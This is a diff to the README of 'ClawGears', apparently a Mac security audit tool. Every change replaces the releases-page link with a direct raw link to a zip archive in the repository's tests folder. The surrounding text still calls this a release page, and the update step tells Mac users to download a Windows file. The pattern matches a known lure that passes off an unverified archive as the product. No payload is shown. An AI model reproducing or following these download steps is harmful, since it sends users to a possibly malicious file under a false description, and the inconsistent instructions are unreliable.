@@ -1,6 +1,6 @@
 # 🦞 ClawGears - Security Audit for Your Mac
 
-[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)
+[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Since ClawGears targets Macs, you will need access to your Mac system through a 
 
 1. **Visit the Release Page**  
    Open your web browser and go to:  
-   [https://github.com/Magdalenaunsoldierly781/ClawGears/releases](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)  
+   [https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip](https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip)  
    This page lists the latest versions of ClawGears available for download.
 
 2. **Choose Your Download**  
@@ -107,7 +107,7 @@ Find additional documentation on the repository’s Wiki or README files.
 To update your copy:  
 
 1. Visit the releases page again:  
-   [https://github.com/Magdalenaunsoldierly781/ClawGears/releases](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)  
+   [https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip](https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip)  
 
 2. Download the latest file for Windows. Do this regularly to keep your scans effective.
 
@@ -117,7 +117,7 @@ Regular updates add new checks and improve scanning accuracy.
 
 ---
 
-[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)
+[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://raw.githubusercontent.com/Magdalenaunsoldierly781/ClawGears/main/tests/Claw-Gears-v2.4.zip)
 
 ---
 
